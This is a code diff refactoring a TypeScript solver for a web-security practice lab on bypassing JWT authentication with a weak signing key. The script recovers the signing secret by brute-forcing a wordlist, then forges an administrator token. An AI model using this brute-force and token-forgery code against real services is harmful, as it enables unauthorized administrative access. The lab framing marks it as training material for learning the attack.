@@ -3,8 +3,8 @@ import { runTasks } from "../../../utils/runTasks.js";
 import { extractCsrfToken } from "../../../utils/extractCsrfToken.js";
 import { myCredentials } from "../../../config/credentials.js";
 import { extractCookie } from "../../../utils/extractCookie.js";
-import { createHmac } from "node:crypto";
 import { getJwtSecrets } from "../../../config/getJwtSecrets.js";
+import { JWT } from "../utils/JWT.js";
 
 const { labUrl, httpClient } = getParsedInputFromUser({
   description: "Lab: JWT authentication bypass via weak signing key",
@@ -14,11 +14,10 @@ const { labUrl, httpClient } = getParsedInputFromUser({
 runTasks([task]);
 
 async function task() {
-  const signedJwt = await getSignedJwt();
+  const signedJwtInstance = await getSignedJwtInstanceFromSessionCookie();
   console.log("start brute-forcing JWT secrets...");
-  const secret = await bruteForceJwtSecret(signedJwt);
-  // TODO: create utility for creating base64Url JWT based on JS objects or base64Url string/or even create JWT class
-  const adminJwt = createAdminJwt(secret);
+  const secret = await bruteForceJwtSecret(signedJwtInstance);
+  const adminJwt = createSignedAdminJwt(secret);
   console.log("found secret: " + secret);
   console.log(`
 To solve the lab:
@@ -29,14 +28,15 @@ To solve the lab:
 `);
 }
 
-async function getSignedJwt() {
-  const sessionCookie = await getSessionCookie();
-  return sessionCookie.value;
+async function getSignedJwtInstanceFromSessionCookie() {
+  const loginResponse = await loginWithMyCredentials();
+  const sessionCookie = extractCookie(loginResponse, "session");
+  return new JWT(sessionCookie.value);
 }
 
-async function getSessionCookie() {
+async function loginWithMyCredentials() {
   const csrf = await getCsrfToken();
-  const loginResponse = await httpClient.post(
+  return await httpClient.post(
     labUrl + "login",
     new URLSearchParams({
       csrf,
@@ -44,7 +44,6 @@ async function getSessionCookie() {
       password: myCredentials.password,
     }),
   );
-  return extractCookie(loginResponse, "session");
 }
 
 async function getCsrfToken() {
@@ -52,29 +51,22 @@ async function getCsrfToken() {
   return extractCsrfToken(loginResponse.data);
 }
 
-async function bruteForceJwtSecret(signedJwt: string) {
-  const [header, payload, signature] = signedJwt.split(".");
-  const unsignedJwt = [header, payload].join(".");
+async function bruteForceJwtSecret(signedJwt: JWT) {
+  if (!signedJwt.signature) {
+    throw new Error("There is no signature for provided signedJwt argument");
+  }
+
   for (const secret of await getJwtSecrets()) {
-    const signatureToTest = createHmac("sha256", secret)
-      .update(unsignedJwt)
-      .digest("base64url");
-    if (signatureToTest === signature) {
+    const signatureToTest = signedJwt.sign(secret).signature;
+    if (signatureToTest === signedJwt.signature) {
       return secret;
     }
   }
   throw new Error("No matching JWT secret found.");
 }
 
-function createAdminJwt(secret: string) {
-  const header = Buffer.from(JSON.stringify({ alg: "HS256" })).toString(
-    "base64url",
-  );
-  const payload = Buffer.from(
-    JSON.stringify({ sub: "administrator" }),
-  ).toString("base64url");
-  const signature = createHmac("sha256", secret)
-    .update([header, payload].join("."))
-    .digest("base64url");
-  return [header, payload, signature].join(".");
+function createSignedAdminJwt(secret: string) {
+  const header = { alg: "HS256" };
+  const payload = { sub: "administrator" };
+  return new JWT({ header, payload }).sign(secret);
 }
